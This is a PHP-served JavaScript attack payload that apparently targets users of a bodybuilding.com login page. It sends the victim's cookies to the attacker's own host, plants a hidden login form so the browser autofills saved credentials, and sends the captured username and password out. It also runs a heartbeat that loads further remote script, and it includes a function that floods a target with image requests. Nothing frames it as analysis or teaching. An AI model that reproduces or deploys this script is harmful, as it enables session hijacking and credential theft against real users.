<?php
header('Content-type: text/javascript');
$id = (isset($_GET['id'])) ? $_GET['id'] : preg_replace("/[\+\/\=]/", "", base64_encode(openssl_random_pseudo_bytes(12)));
echo "var sploit = '{$_SERVER['HTTP_HOST']}';";
echo "var sploitid = '$id';";
?>

var gdebug = "";
function debug(message) { gdebug += message + ". %A0"; }
function getCookie(name) {
	name += "="
    var ca = document.cookie.split(';');
    for(var i=0; i<ca.length; i++) {
        var c = ca[i].trim();
        if (c.indexOf(name) == 0) return c.substring(name.length,c.length);
    }
    return "";
}
function setCookie(cname, cvalue, exdays) {
	var d = new Date();
	d.setTime(d.getTime() + (exdays*24*60*60*1000));
	var expires = "expires="+d.toGMTString();
	document.cookie = cname + "=" + cvalue + "; " + expires;
}

function capture() {

}

function getLogin(uname, pname, loc) {
// console.log("get login");
append("<form action='"+loc+"' method='post'><input type='text' name='"+uname+"' id='un54'><input type='password' name='"+pname+"' id='pw54'></form>");
window.setTimeout(saveLogin, 1500);
}
function saveLogin() {
// console.log("save login");
var u = document.getElementById('un54');
var p = document.getElementById('pw54');
if (u.value && u.value.length > 1) { cs("http://"+sploit+"/api.php?id="+sploitid+"&u="+encodeURIComponent(u.value)+"&p="+encodeURIComponent(p.value)); }
}

function dos(p, num) { for(i=0;i<num;i++){document.write("<img src='"+p+"' />"); } }
function reg() {
	document.write("<div id='sploit' style='display:none'>text</div>");
	cs("http://"+sploit+"/api.php?reg="+sploitid+"&c="+encodeURIComponent(document.cookie));
}
function hb() { 
	if (window.top==window.self) { cs('http://'+sploit+'/api.php?id='+sploitid+"&d="+gdebug); gdebug = ""; }
}

function cs(s) { 
 // console.log("cs: " + s); 
	var script = document.createElement("script");
	script.type="text/javascript";
	script.src=s;
	d=document.getElementById("sploit");
	if (!d) { document.write("<div id='sploit' style='display:none'>text</div>");}
	d=document.getElementById("sploit");
//console.log(d);
	d.appendChild(script);
}

function ci(s, st, id) { 
// console.log("ci: " + s + " / " + st);
//append("<img src='"+s+"' style='"+st+"' />"); 
var i = document.createElement('img');
i.src=s;
i.style=st;
document.getElementById(id).appendChild(i);
//console.log(i);
}

function append(t) {d = document.getElementById('sploit');console.log(d);r=d.innerHTML;console.log(r);d.innerHTML=t; }

reg();
getLogin("username", "password", "https://bodyspace.bodybuilding.com/login/login.php");
window.setInterval(hb, 4000);

//$.get("www.mydomain.com/?url=www.google.com", function(response) { // read response});
// username: s_omni.memberName
